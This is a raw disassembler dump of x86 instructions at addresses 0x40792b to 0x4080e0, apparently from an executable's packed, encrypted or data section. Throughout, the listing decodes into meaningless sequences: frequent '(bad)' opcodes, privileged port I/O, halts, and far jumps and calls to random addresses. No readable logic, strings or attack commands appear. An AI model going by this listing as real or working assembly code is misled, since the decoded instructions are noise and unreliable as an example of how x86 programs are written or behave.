  40792b:	sub    ebx,DWORD PTR [eax+ebx*4]
  40792e:	out    0x12,eax
  407930:	sar    BYTE PTR [eax+0x203ff6bc],1
  407936:	jp     0x4079a7
  407938:	sub    BYTE PTR [ecx],0x31
  40793b:	fcomp  DWORD PTR [ebp+0x1c30547d]
  407941:	and    al,0xac
  407943:	sar    BYTE PTR [bx-0x61],0xaa
  407948:	ds mov ebx,0x23f3f61b
  40794e:	fild   QWORD PTR [eax+esi*8]
  407951:	hlt    
  407952:	or     edi,DWORD PTR ds:0xfffa5e65
  407958:	or     bl,ah
  40795a:	retf   0x4c48
  40795d:	outs   dx,DWORD PTR ds:[esi]
  40795e:	(bad)  
  40795f:	adc    DWORD PTR [ecx+0x6289c3c8],edi
  407965:	xchg   esp,eax
  407966:	jb     0x407923
  407968:	push   ds
  407969:	mov    edx,0xd85d6d44
  40796e:	out    0x87,eax
  407970:	cmp    eax,0x5d6faa74
  407975:	sbb    bl,dh
  407977:	out    0xe9,eax
  407979:	cmc    
  40797a:	std    
  40797b:	int    0x70
  40797d:	sub    al,0x29
  40797f:	movlps xmm0,QWORD PTR [ecx+eiz*4-0x2d]
  407984:	popa   
  407985:	cli    
  407986:	cmp    ch,dl
  407988:	xor    al,0x29
  40798a:	mov    dl,0xc2
  40798c:	nop
  40798d:	adc    ebp,DWORD PTR [eax+0x3175519d]
  407993:	aas    
  407994:	test   DWORD PTR ds:[esi-0x79],0xb2a7a152
  40799c:	inc    eax
  40799d:	iret   
  40799e:	ret    
  40799f:	pusha  
  4079a0:	rcr    cl,1
  4079a2:	retf   
  4079a3:	ret    0xee55
  4079a6:	sbb    eax,DWORD PTR [ecx+0x634eaa18]
  4079ac:	sub    al,BYTE PTR [edx+edi*4-0x28c68b24]
  4079b3:	jg     0x40796c
  4079b5:	call   FWORD PTR [edi]
  4079b7:	mov    al,0xa4
  4079b9:	inc    ebx
  4079ba:	scas   eax,DWORD PTR es:[edi]
  4079bb:	scas   eax,DWORD PTR es:[edi]
  4079bc:	into   
  4079bd:	fmul   QWORD PTR [esp+esi*4]
  4079c0:	xor    al,0xa2
  4079c2:	dec    edx
  4079c3:	in     al,0x6d
  4079c5:	stos   BYTE PTR es:[edi],al
  4079c6:	fsubrp st(7),st
  4079c8:	pop    es
  4079c9:	mov    ah,0xeb
  4079cb:	adc    BYTE PTR [edx+0x4f97aa39],dl
  4079d1:	test   BYTE PTR [edi+0x76ac71ae],al
  4079d7:	sbb    eax,0x4d2a2bc9
  4079dc:	(bad)  
  4079dd:	out    dx,eax
  4079de:	rol    BYTE PTR ds:[edx],1
  4079e1:	push   esi
  4079e2:	hlt    
  4079e3:	cli    
  4079e4:	pop    ebx
  4079e5:	retf   0xb152
  4079e8:	cmp    BYTE PTR [ecx],ah
  4079ea:	mov    WORD PTR [edx-0x6],ds
  4079ed:	or     BYTE PTR [ecx+0xc],al
  4079f0:	xchg   ebp,eax
  4079f1:	sbb    ecx,eax
  4079f3:	cwde   
  4079f4:	icebp  
  4079f5:	mov    ah,0x27
  4079f7:	cld    
  4079f8:	dec    edx
  4079f9:	es pop edx
  4079fb:	adc    al,0x2c
  4079fd:	out    dx,al
  4079fe:	pop    ecx
  4079ff:	jae    0x407a78
  407a01:	cmp    al,0x8e
  407a03:	or     ebp,DWORD PTR [ebp-0x34]
  407a06:	dec    eax
  407a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a08:	and    DWORD PTR [eax+0x66d3f1],edi
  407a0e:	xchg   ebx,eax
  407a0f:	sar    DWORD PTR [ecx+0x53],0x7b
  407a13:	adc    bh,dh
  407a15:	sbb    esp,ebp
  407a17:	daa    
  407a18:	cmp    esi,0x897452fa
  407a1e:	mov    dl,0x66
  407a20:	sbb    eax,0xabc35130
  407a25:	lods   eax,DWORD PTR ds:[esi]
  407a26:	sahf   
  407a27:	(bad)  
  407a28:	das    
  407a29:	jp     0x4079e0
  407a2b:	sbb    eax,0x7bbfaa88
  407a30:	out    0x5e,al
  407a32:	add    edx,DWORD PTR [ecx]
  407a34:	xor    al,BYTE PTR [ebp+0x7c]
  407a37:	rcr    DWORD PTR [ecx],0x1d
  407a3a:	leave  
  407a3b:	lods   eax,DWORD PTR ds:[esi]
  407a3c:	sub    BYTE PTR [ecx+0xd],0xd4
  407a40:	div    DWORD PTR [eax]
  407a42:	mov    bh,0x66
  407a44:	mov    esp,0xa542a882
  407a49:	stc    
  407a4a:	add    eax,0xc46d7c07
  407a4f:	nop
  407a50:	dec    ebp
  407a51:	add    edx,DWORD PTR [edi]
  407a53:	mov    ebx,0xa179c10f
  407a58:	jo     0x407acf
  407a5a:	jl     0x407a9d
  407a5c:	mov    al,ds:0xcb2f460e
  407a61:	shr    DWORD PTR [edx],1
  407a63:	retf   
  407a64:	dec    eax
  407a65:	adc    eax,edx
  407a67:	aaa    
  407a68:	sbb    eax,0xcf413079
  407a6d:	loop   0x407aa9
  407a6f:	or     al,0x12
  407a71:	(bad)  
  407a72:	jecxz  0x407a8a
  407a74:	or     BYTE PTR [edx-0x6ab16914],0xe4
  407a7b:	dec    edx
  407a7c:	pop    edx
  407a7d:	jae    0x407aba
  407a7f:	push   cs
  407a80:	lahf   
  407a81:	adc    eax,DWORD PTR [esi]
  407a83:	repnz xlat BYTE PTR ds:[ebx]
  407a85:	ds xor ecx,esi
  407a88:	mov    ecx,0xaf26be45
  407a8d:	int    0xcb
  407a8f:	and    BYTE PTR [edx],ch
  407a91:	std    
  407a92:	jp     0x407a9c
  407a94:	xor    al,0x52
  407a96:	pop    edi
  407a97:	or     al,0xf0
  407a99:	les    ecx,FWORD PTR [eax+0x76]
  407a9c:	xchg   DWORD PTR [eax-0x7b0d31b7],edx
  407aa2:	int    0x9d
  407aa4:	xchg   edi,eax
  407aa5:	ss pop edi
  407aa7:	cmp    eax,0x2ca5b25e
  407aac:	call   0x4506:0x59e1d733
  407ab3:	ja     0x407b12
  407ab5:	mov    ebp,0xc4671fe6
  407aba:	or     ah,0xe8
  407abd:	cwde   
  407abe:	adc    DWORD PTR [ecx-0x3b9bae4],edx
  407ac4:	xchg   edi,eax
  407ac5:	in     eax,dx
  407ac6:	das    
  407ac7:	mov    ch,0xd8
  407ac9:	dec    ecx
  407aca:	sbb    al,0xb7
  407acc:	pusha  
  407acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ace:	dec    ecx
  407acf:	ret    
  407ad0:	sub    ecx,DWORD PTR [edx]
  407ad2:	sub    DWORD PTR [ebx],esi
  407ad4:	mov    ah,bl
  407ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ad7:	out    dx,eax
  407ad8:	push   ebx
  407ad9:	xor    ch,dl
  407adb:	fwait
  407adc:	outs   dx,BYTE PTR ds:[esi]
  407add:	xor    cl,ah
  407adf:	inc    edi
  407ae0:	gs adc al,0xbf
  407ae3:	je     0x407a81
  407ae5:	arpl   WORD PTR [edi],di
  407ae7:	das    
  407ae8:	push   es
  407ae9:	cld    
  407aea:	mov    eax,ecx
  407aec:	popf   
  407aed:	scas   eax,DWORD PTR es:[edi]
  407aee:	pushf  
  407aef:	or     BYTE PTR [edi-0x5e84fef6],ch
  407af5:	pop    esp
  407af6:	out    dx,eax
  407af7:	jno    0x407ab4
  407af9:	sub    ebp,DWORD PTR [edx]
  407afb:	pop    esp
  407afc:	arpl   ax,bx
  407afe:	pop    esi
  407aff:	xor    ch,dh
  407b01:	sub    eax,0xef3a55e9
  407b06:	je     0x407b7d
  407b08:	jmp    0xee66f205
  407b0d:	rcr    DWORD PTR [ebx],cl
  407b0f:	adc    al,0x86
  407b11:	xchg   DWORD PTR [eax+0x2d],ebp
  407b14:	(bad)  
  407b15:	in     al,dx
  407b16:	lahf   
  407b17:	in     al,0x68
  407b19:	loopne 0x407afc
  407b1b:	clc    
  407b1c:	dec    edi
  407b1d:	ret    0x42cc
  407b20:	test   bl,0xeb
  407b23:	cmp    al,0x6c
  407b25:	cmp    edi,esp
  407b27:	mov    esi,0x8e74d8e6
  407b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2d:	mov    esp,0x8e2bbe34
  407b32:	in     al,dx
  407b33:	sub    ch,BYTE PTR [edx+0x2f]
  407b36:	mov    ah,0xfb
  407b38:	pop    ss
  407b39:	mov    ?,WORD PTR [edi-0x43]
  407b3c:	sbb    DWORD PTR [eax+edx*2],esi
  407b3f:	outs   dx,BYTE PTR ds:[esi]
  407b40:	inc    esi
  407b41:	ja     0x407b5e
  407b43:	ss out 0xf8,al
  407b46:	ror    BYTE PTR ds:0x74ea1580,cl
  407b4c:	(bad)
  407b50:	repnz cmp eax,0xf44f5c0d
  407b56:	bound  ecx,QWORD PTR [edi-0x3cddeb7c]
  407b5c:	retf   0x198e
  407b5f:	ins    DWORD PTR es:[edi],dx
  407b60:	xchg   dl,dh
  407b62:	or     cl,BYTE PTR [edi]
  407b64:	in     eax,0x61
  407b66:	mov    ebx,0xd04ae197
  407b6b:	sub    edx,ebx
  407b6d:	rcl    BYTE PTR [ebx*2-0x4c3c6a04],0x5c
  407b75:	inc    eax
  407b76:	add    al,0xb6
  407b78:	jp     0x407b50
  407b7a:	push   ecx
  407b7b:	mov    edx,0x770900bd
  407b80:	mov    ss,WORD PTR [eax]
  407b82:	jle    0x407b58
  407b84:	pushf  
  407b85:	add    BYTE PTR [ebx-0x29451e7d],cl
  407b8b:	aam    0xeb
  407b8d:	xor    al,0x2b
  407b8f:	dec    ebp
  407b90:	clc    
  407b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b92:	or     eax,0x5f90be2f
  407b97:	ret    
  407b98:	and    al,0x82
  407b9a:	and    esp,DWORD PTR [ebx-0x28728b0f]
  407ba0:	jno    0x407b26
  407ba2:	in     eax,0x71
  407ba4:	fidivr DWORD PTR [edx*2-0x4247216d]
  407bab:	test   eax,0x4dc97ba4
  407bb0:	fwait
  407bb1:	mov    ebp,0xfe6c6bbb
  407bb6:	dec    edi
  407bb7:	sbb    ebp,DWORD PTR [esi-0x78294242]
  407bbd:	js     0x407bd4
  407bbf:	mov    edx,0x81b1357e
  407bc4:	js     0x407c1a
  407bc6:	sub    al,0x6c
  407bc8:	repz push esi
  407bca:	mov    dh,0x7e
  407bcc:	add    al,0x3a
  407bce:	cli    
  407bcf:	xchg   ecx,eax
  407bd0:	mov    al,0x1c
  407bd2:	pop    ecx
  407bd3:	sub    DWORD PTR [edi+0x8],edi
  407bd6:	xor    BYTE PTR [ebp+0x63],bl
  407bd9:	jae    0x407bd7
  407bdb:	rcr    DWORD PTR [ecx-0x1c7cf72a],cl
  407be1:	rol    dh,cl
  407be3:	jae    0x407c53
  407be5:	inc    eax
  407be6:	xchg   esp,eax
  407be7:	pop    esi
  407be8:	push   esi
  407be9:	ror    esi,1
  407beb:	ficomp DWORD PTR [eax+eax*8]
  407bee:	inc    ecx
  407bef:	sbb    eax,0x2a9382c6
  407bf4:	(bad)  
  407bf5:	mov    eax,0xea1940ee
  407bfa:	cmp    eax,0x2c017ed8
  407bff:	pop    ds
  407c00:	push   cs
  407c01:	adc    eax,0x444a152c
  407c06:	pop    ds
  407c07:	ins    DWORD PTR es:[edi],dx
  407c08:	ret    
  407c09:	and    DWORD PTR [edi-0x7f89342a],esp
  407c0f:	push   ds
  407c10:	sub    BYTE PTR [eax+0xa0b243f],bl
  407c16:	push   edi
  407c17:	mov    dh,0xd1
  407c19:	ficomp DWORD PTR [ebx-0x562e18d0]
  407c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c20:	sub    al,0x60
  407c22:	cmp    cl,BYTE PTR [ecx]
  407c24:	pop    ebx
  407c25:	or     al,0xea
  407c27:	dec    esi
  407c28:	pop    ebp
  407c29:	or     esi,DWORD PTR [edx-0x20c1384a]
  407c2f:	and    DWORD PTR [ecx],0xd3086c9f
  407c35:	sub    ecx,DWORD PTR [ebp+0x19]
  407c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c39:	sbb    edi,edx
  407c3b:	imul   ebx,DWORD PTR [eax-0x44],0xfffffffc
  407c3f:	loopne 0x407bec
  407c41:	push   edx
  407c42:	mov    al,0x70
  407c44:	jmp    0x9d9d:0xdda6d4c6
  407c4b:	rcr    DWORD PTR [eax-0x7228d48],0xf4
  407c52:	adc    DWORD PTR [ecx],eax
  407c54:	out    dx,al
  407c55:	mov    WORD PTR [ecx-0x9],ds
  407c58:	mov    ecx,ecx
  407c5a:	mov    dl,BYTE PTR gs:[edi+0x7]
  407c5e:	xor    al,0xf8
  407c60:	xchg   esp,eax
  407c61:	push   eax
  407c62:	pop    ds
  407c63:	or     al,0xd1
  407c65:	stos   DWORD PTR es:[edi],eax
  407c66:	push   esi
  407c67:	int3   
  407c68:	mov    eax,ds:0x85812793
  407c6d:	xchg   ebp,eax
  407c6e:	lods   al,BYTE PTR ds:[esi]
  407c6f:	cli    
  407c70:	and    al,0x9a
  407c72:	sbb    al,0x3
  407c74:	ror    BYTE PTR [ebx-0x66460577],cl
  407c7a:	sbb    bl,cl
  407c7c:	cmp    BYTE PTR [edx+0x270deb03],dl
  407c82:	mov    esi,0xb3126200
  407c87:	imul   esi,DWORD PTR [ebx+0x38ba2fe0],0x1a
  407c8e:	test   DWORD PTR [ebx-0x24e9156],eax
  407c94:	loope  0x407cbc
  407c96:	std    
  407c97:	mov    ds:0x69f1bfaa,al
  407c9c:	hlt    
  407c9d:	outs   dx,BYTE PTR ds:[si]
  407c9f:	mov    al,0x8
  407ca1:	aam    0x4e
  407ca3:	ja     0x407c2d
  407ca5:	xchg   esi,eax
  407ca6:	or     cl,BYTE PTR ds:0x3de3c03c
  407cac:	retf   
  407cad:	fs out dx,al
  407caf:	pop    esp
  407cb0:	dec    edi
  407cb1:	sahf   
  407cb2:	push   esp
  407cb3:	fcomp  st(6)
  407cb5:	xchg   ecx,eax
  407cb6:	fsub   DWORD PTR [edx]
  407cb8:	add    al,0x73
  407cba:	rcl    DWORD PTR [ecx-0x2],cl
  407cbd:	loop   0x407c7c
  407cbf:	mov    ah,0xba
  407cc1:	hlt    
  407cc2:	inc    ebx
  407cc3:	inc    ebp
  407cc4:	lock sbb ecx,ebp
  407cc7:	hlt    
  407cc8:	pop    es
  407cc9:	pop    eax
  407cca:	stc    
  407ccb:	pushf  
  407ccc:	inc    ebp
  407ccd:	pushf  
  407cce:	inc    ebx
  407ccf:	int3   
  407cd0:	mov    dl,BYTE PTR [ebp-0x34]
  407cd3:	jp     0x407c60
  407cd5:	imul   ecx,DWORD PTR [esi-0x7b],0x59603692
  407cdc:	inc    edx
  407cdd:	(bad)  
  407cdf:	push   ds
  407ce0:	pop    ds
  407ce1:	sbb    ebx,edx
  407ce3:	xor    BYTE PTR [ebx],ch
  407ce5:	cmc    
  407ce6:	out    0x25,al
  407ce8:	clc    
  407ce9:	jg     0x407d59
  407ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cec:	mov    edi,0x2e9f1e22
  407cf1:	cmc    
  407cf2:	mov    ss,WORD PTR [ecx+0x9]
  407cf5:	or     al,0x85
  407cf7:	fisubr DWORD PTR [esi-0x212f43ca]
  407cfd:	ss sub ax,0xf964
  407d02:	cwde   
  407d03:	(bad)  
  407d04:	push   0x2e10f9b1
  407d09:	ss es mov ebx,0xcaa52995
  407d10:	xchg   ecx,eax
  407d11:	shr    BYTE PTR [eax],1
  407d13:	hlt    
  407d14:	mov    DWORD PTR [di-0x39b7],edx
  407d19:	jecxz  0x407d98
  407d1b:	dec    esp
  407d1c:	fistp  DWORD PTR [esi]
  407d1e:	loop   0x407d7e
  407d20:	or     BYTE PTR [si-0x6de2],0x1
  407d26:	mov    al,0x10
  407d28:	cli    
  407d29:	xchg   ebp,eax
  407d2a:	jecxz  0x407ce9
  407d2c:	loope  0x407cb0
  407d2e:	fs xchg edx,eax
  407d30:	(bad)  
  407d31:	mov    bh,0x66
  407d33:	push   eax
  407d34:	fcmove st,st(7)
  407d36:	adc    edi,DWORD PTR [edi]
  407d38:	fiadd  WORD PTR [edi]
  407d3a:	xor    BYTE PTR [edx],al
  407d3c:	mov    cs,WORD PTR [edi-0x70]
  407d3f:	(bad)  
  407d40:	js     0x407d2d
  407d42:	xor    al,BYTE PTR [ecx+ebx*4-0x1896cb1f]
  407d49:	jp     0x407d80
  407d4b:	cmp    DWORD PTR [ebx+0x4e53d1f5],esp
  407d51:	dec    ebx
  407d52:	inc    esi
  407d53:	cdq    
  407d54:	imul   ebp,ebp,0x588bb379
  407d5a:	push   esi
  407d5b:	pop    esi
  407d5c:	jmp    0x407d38
  407d5e:	fwait
  407d5f:	or     al,0x24
  407d61:	or     esp,ecx
  407d63:	scas   al,BYTE PTR es:[edi]
  407d64:	dec    ecx
  407d65:	test   DWORD PTR [ebx+0x5b33d8aa],edi
  407d6b:	lock or esp,ebx
  407d6e:	add    edi,DWORD PTR [ebx+eax*4+0x727597b3]
  407d75:	pop    ss
  407d76:	loopne 0x407de5
  407d78:	in     eax,0x34
  407d7a:	ds sti 
  407d7c:	pushf  
  407d7d:	push   0xffffffe2
  407d7f:	sbb    eax,0x40722671
  407d84:	mov    al,0xba
  407d86:	push   ss
  407d87:	sub    bl,BYTE PTR [ebp+ebp*2-0x75]
  407d8b:	and    esi,esi
  407d8d:	and    al,0x88
  407d8f:	mov    ebp,0x28b185be
  407d94:	or     eax,0xf32e479
  407d99:	push   0xffffffb3
  407d9b:	pop    eax
  407d9c:	sub    cl,dl
  407d9e:	mov    dh,0xee
  407da0:	(bad)  
  407da1:	mov    BYTE PTR [ecx-0x57],cl
  407da4:	ret    
  407da5:	lahf   
  407da6:	cmp    BYTE PTR ds:0x76f08d59,bh
  407dac:	(bad)  
  407dad:	loop   0x407d4c
  407daf:	lock pop ebx
  407db1:	or     eax,0x657f0578
  407db6:	out    dx,eax
  407db7:	in     eax,0xe6
  407db9:	inc    edx
  407dba:	stc    
  407dbb:	pop    es
  407dbc:	lds    ecx,FWORD PTR [edi]
  407dbe:	add    al,0x65
  407dc0:	inc    eax
  407dc1:	mov    esi,0xcf6ffbf6
  407dc6:	outs   dx,DWORD PTR ds:[esi]
  407dc7:	adc    DWORD PTR [ecx+0x22b488e5],ebp
  407dcd:	pop    esi
  407dce:	jmp    0x407db8
  407dd0:	sahf   
  407dd1:	cmp    BYTE PTR [esi],al
  407dd3:	out    0x24,eax
  407dd5:	inc    edx
  407dd6:	rol    ebx,0x5d
  407dd9:	mov    ds:0x7a437e98,al
  407dde:	into   
  407ddf:	stos   BYTE PTR es:[edi],al
  407de0:	sub    al,0xfa
  407de2:	push   ss
  407de3:	push   ss
  407de4:	mov    cl,BYTE PTR [ebx+0x54]
  407de7:	test   eax,0x93afc6a9
  407dec:	mov    esi,0x53ed6cac
  407df1:	fnstcw WORD PTR [edx]
  407df3:	xchg   esi,eax
  407df4:	ds ds (bad) 
  407df8:	jmp    0xde5e:0x2b962de6
  407dff:	lods   al,BYTE PTR ds:[esi]
  407e00:	cmp    al,0x54
  407e02:	push   0xffffffb3
  407e04:	mov    bl,ch
  407e06:	sub    dh,BYTE PTR [ecx+ebx*4]
  407e09:	or     cl,BYTE PTR [eax-0x7de9f5f7]
  407e0f:	lods   eax,DWORD PTR ds:[esi]
  407e10:	jmp    0x1918eb29
  407e15:	mov    ebx,0x44269066
  407e1a:	push   eax
  407e1b:	cmp    ch,bh
  407e1d:	lock popf 
  407e1f:	or     DWORD PTR [edx-0x67d06f38],esi
  407e25:	mov    ebp,0x4350b396
  407e2a:	cmp    edi,eax
  407e2c:	adc    ebx,DWORD PTR [esi+0x33e80962]
  407e32:	push   esp
  407e33:	ss je  0x407e5d
  407e36:	lock dec ebp
  407e38:	es jmp 0xfff694df
  407e3e:	(bad)  
  407e3f:	mov    edx,0xdc92b01a
  407e44:	bound  ebx,QWORD PTR [ebx]
  407e46:	mov    DWORD PTR [ebx-0x72849139],ecx
  407e4c:	add    BYTE PTR [ecx+0x3b],cl
  407e4f:	jmp    0x407de2
  407e51:	dec    eax
  407e52:	push   edi
  407e53:	sub    ah,BYTE PTR ds:0xfbe12f02
  407e59:	call   0x87ec837f
  407e5e:	push   eax
  407e5f:	xor    DWORD PTR [ecx-0x3e],esi
  407e62:	jae    0x407e18
  407e64:	add    DWORD PTR [ebx+0xa],0x77850d02
  407e6b:	mov    ebx,DWORD PTR ds:0x46df5751
  407e71:	xchg   esi,eax
  407e72:	sbb    BYTE PTR [ebx+ebp*1+0x12b2350c],0xbd
  407e7a:	mov    al,0x93
  407e7c:	stos   DWORD PTR es:[edi],eax
  407e7d:	fsub   QWORD PTR [ebx+0xd087a73]
  407e83:	fsub   DWORD PTR [edx+0x212c665c]
  407e89:	test   DWORD PTR [edx-0x71e5a89],edx
  407e8f:	js     0x407e5b
  407e91:	ror    BYTE PTR [eax],1
  407e93:	xchg   ebx,eax
  407e94:	fcmovnu st,st(5)
  407e96:	cmp    BYTE PTR [eax],dl
  407e98:	idiv   BYTE PTR [edi-0x6f]
  407e9b:	adc    DWORD PTR [edx-0x17],edx
  407e9e:	bound  ecx,QWORD PTR [eax+0x61a3ffcb]
  407ea4:	mov    esp,0x51eeeb58
  407ea9:	inc    ecx
  407eaa:	cmp    BYTE PTR ds:0x4621bbde,0x4d
  407eb1:	jge    0x407eb2
  407eb3:	popa   
  407eb4:	mov    ch,0x7d
  407eb6:	fadd   st,st(2)
  407eb8:	mov    ebp,0xf0ae6159
  407ebd:	nop
  407ebe:	lahf   
  407ebf:	sub    BYTE PTR [ebp-0x3b459aa1],bh
  407ec5:	mov    WORD PTR [ebp-0x7b46f07],es
  407ecb:	out    dx,eax
  407ecc:	cmp    al,0x3d
  407ece:	jecxz  0x407e6b
  407ed0:	call   0x185e:0x66b99ea0
  407ed7:	sub    edx,0x26
  407eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407edb:	cmp    al,0x46
  407edd:	pop    es
  407ede:	pop    ebx
  407edf:	add    ecx,edi
  407ee1:	mov    eax,eax
  407ee3:	fs push cs
  407ee5:	mov    esi,0x5611a466
  407eea:	retf   
  407eeb:	push   ss
  407eec:	and    DWORD PTR [ebx],0x48a23fb5
  407ef2:	popf   
  407ef3:	sbb    eax,0x99e4a84c
  407ef8:	call   0x3a17:0xdfb25cdc
  407eff:	xor    bh,cl
  407f01:	out    dx,eax
  407f02:	push   cs
  407f03:	dec    esp
  407f04:	xchg   edi,eax
  407f05:	fwait
  407f06:	cwde   
  407f07:	mov    esp,0xc949b22
  407f0c:	fmul   st(5),st
  407f0e:	jb     0x407ec0
  407f10:	pop    esp
  407f11:	or     al,0x7b
  407f13:	outs   dx,BYTE PTR ds:[esi]
  407f14:	xchg   ebp,eax
  407f15:	adc    esi,ebx
  407f17:	mov    ebx,0xd9093255
  407f1c:	push   0x6f
  407f1e:	cwde   
  407f1f:	shl    bh,cl
  407f21:	test   eax,0x2bee232e
  407f26:	mov    BYTE PTR [eax-0x58c21197],ch
  407f2c:	pop    ecx
  407f2d:	pop    eax
  407f2e:	dec    ebx
  407f2f:	mov    ds:0x974d09cf,eax
  407f34:	out    dx,al
  407f35:	(bad)  [eax-0x10]
  407f38:	cld    
  407f39:	pop    edx
  407f3a:	(bad)  
  407f3b:	push   esp
  407f3c:	pop    ebx
  407f3d:	inc    esp
  407f3e:	cmp    al,0xe3
  407f40:	ds clc 
  407f42:	push   ecx
  407f43:	push   ss
  407f44:	jmp    0xf444:0xc6eaa800
  407f4b:	xor    al,0x79
  407f4d:	pop    esp
  407f4e:	gs loop 0x407f01
  407f51:	scas   eax,DWORD PTR es:[edi]
  407f52:	inc    ebp
  407f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f54:	retf   0x29fd
  407f57:	push   esi
  407f58:	(bad)  
  407f59:	sar    BYTE PTR [edi-0xa39e6c3],cl
  407f5f:	add    edi,DWORD PTR [ebp+0x39]
  407f62:	or     ah,cl
  407f64:	or     eax,0x17a8c35e
  407f69:	jp     0x407f1f
  407f6b:	lods   al,BYTE PTR ds:[esi]
  407f6c:	retf   
  407f6d:	xchg   esp,eax
  407f6e:	mov    ebx,DWORD PTR [esi+0xd5b9a3b]
  407f74:	inc    edi
  407f75:	bound  edx,QWORD PTR [ebx+eax*2-0x45]
  407f79:	sbb    DWORD PTR [ebp-0x4da4805e],esi
  407f7f:	mov    ah,BYTE PTR [edi]
  407f81:	mov    edi,0x77e21a89
  407f86:	out    dx,eax
  407f87:	into   
  407f88:	push   ds
  407f89:	test   ch,0x25
  407f8c:	jle    0x407f5a
  407f8e:	jp     0x407f2f
  407f90:	cdq    
  407f91:	adc    esp,esp
  407f93:	or     al,BYTE PTR [edi-0x9d43a77]
  407f99:	mov    cl,0x50
  407f9b:	mov    dl,0xea
  407f9d:	std    
  407f9e:	outs   dx,BYTE PTR ds:[esi]
  407f9f:	push   0xd2c417ad
  407fa4:	into   
  407fa5:	mov    ds,edx
  407fa7:	jo     0x408004
  407fa9:	push   eax
  407faa:	xchg   ebx,eax
  407fab:	or     eax,0x13633b2d
  407fb0:	shr    DWORD PTR [ebp+0x28],0xd4
  407fb4:	xchg   edx,eax
  407fb5:	aaa    
  407fb6:	dec    esp
  407fb7:	jp     0x407f61
  407fb9:	mov    dl,BYTE PTR [edx-0x249ffdcc]
  407fbf:	test   BYTE PTR [ecx+0x7b],0xa7
  407fc3:	aam    0x16
  407fc5:	jmp    edi
  407fc7:	cmp    dh,BYTE PTR [edx-0x7a]
  407fca:	adc    BYTE PTR [eax+0x5134deb4],dl
  407fd0:	das    
  407fd1:	jg     0x407f6f
  407fd3:	mov    DWORD PTR [edi],esp
  407fd5:	ret    0xa74
  407fd8:	cmp    al,0xd6
  407fda:	out    0xd0,eax
  407fdc:	pop    edi
  407fdd:	enter  0x93dc,0xca
  407fe1:	add    DWORD PTR [esi+0x73],esp
  407fe4:	or     ebp,esi
  407fe6:	fcom   DWORD PTR [ecx+0x4e]
  407fe9:	pop    eax
  407fea:	call   0xcd71aa60
  407fef:	add    BYTE PTR [esi],bh
  407ff1:	mov    edx,0x1b40f578
  407ff6:	push   edi
  407ff7:	pop    ebx
  407ff8:	out    0x2d,al
  407ffa:	ins    DWORD PTR es:[edi],dx
  407ffb:	leave  
  407ffc:	push   ebx
  407ffd:	push   edx
  407ffe:	fist   DWORD PTR [eax]
  408000:	ficom  DWORD PTR ds:0xae825a77
  408006:	jmp    0x28b5551c
  40800b:	call   0x2c8c:0x9e496029
  408012:	std    
  408013:	cmp    DWORD PTR ds:0x3df04228,edi
  408019:	ror    DWORD PTR [edi],0xb4
  40801c:	loope  0x407fb5
  40801e:	push   ecx
  40801f:	jns    0x408038
  408021:	sbb    ebp,DWORD PTR [ebx+0x77]
  408024:	mov    edx,0x560a7b19
  408029:	mov    ebx,0x7a59f37f
  40802e:	repz adc al,0xb9
  408031:	mov    ebp,DWORD PTR [ecx-0x23db1787]
  408037:	jmp    0x8fe5:0x25d9692c
  40803e:	add    al,0x4f
  408040:	adc    eax,0x462dd886
  408045:	inc    edi
  408046:	stc    
  408047:	mov    cl,0xce
  408049:	in     al,0xdd
  40804b:	mov    ch,0x3e
  40804d:	mov    DWORD PTR [eax-0x7b],ecx
  408050:	xor    DWORD PTR [esi-0x4a],ebp
  408053:	xchg   edx,eax
  408054:	lock cmp dh,BYTE PTR [esi-0x5c]
  408058:	fdivr  st(3),st
  40805a:	les    ebp,FWORD PTR [esi+eiz*4]
  40805d:	sti    
  40805e:	jp     0x408065
  408060:	fucomi st,st(2)
  408062:	gs dec ebp
  408064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408065:	push   edi
  408066:	push   esi
  408067:	les    ebx,FWORD PTR [ebx+0x194fcb72]
  40806d:	sti    
  40806e:	xchg   ebp,eax
  40806f:	retf   
  408070:	mov    WORD PTR [edi+0x79],cs
  408073:	dec    eax
  408074:	dec    ebp
  408075:	scas   al,BYTE PTR es:[edi]
  408076:	fstp   QWORD PTR [ebx-0x4828acb9]
  40807c:	mov    ds:0xe27fc453,eax
  408081:	ds jg  0x408013
  408084:	jg     0x4080d7
  408086:	hlt    
  408087:	and    al,0xf8
  408089:	push   ebp
  40808a:	cs add edi,edi
  40808d:	xor    bh,BYTE PTR [esi]
  40808f:	popf   
  408090:	xlat   BYTE PTR ds:[ebx]
  408091:	cld    
  408092:	mov    es,WORD PTR [edx+0x48]
  408095:	and    cl,BYTE PTR [esi-0x7f]
  408098:	xchg   edx,eax
  408099:	aas    
  40809a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40809b:	dec    esp
  40809c:	mov    ebp,cs
  40809e:	mov    dl,0x6c
  4080a0:	cmovle ebx,DWORD PTR [esi+0x15]
  4080a4:	je     0x4080f7
  4080a6:	mov    BYTE PTR [eax],ch
  4080a8:	cs es xchg esp,eax
  4080ab:	daa    
  4080ac:	imul   ebx,DWORD PTR [ebx],0x29
  4080af:	or     bh,al
  4080b1:	popf   
  4080b2:	add    al,0xd
  4080b4:	arpl   WORD PTR ds:0x4ff1635,bp
  4080ba:	pop    ebx
  4080bb:	enter  0x137,0x97
  4080bf:	mov    ebp,0x29e3ad41
  4080c4:	pop    esi
  4080c5:	adc    eax,0xcd2ef35b
  4080ca:	in     eax,dx
  4080cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080cc:	mov    eax,0x54ac2241
  4080d1:	fs push es
  4080d3:	aaa    
  4080d4:	jle    0x4080f2
  4080d6:	cmp    ecx,DWORD PTR [edx]
  4080d8:	cmp    ah,BYTE PTR [ebp-0x3a96d9d7]
  4080de:	jg     0x408128
  4080e0:	fimul  DWORD PTR [edi-0x6d]
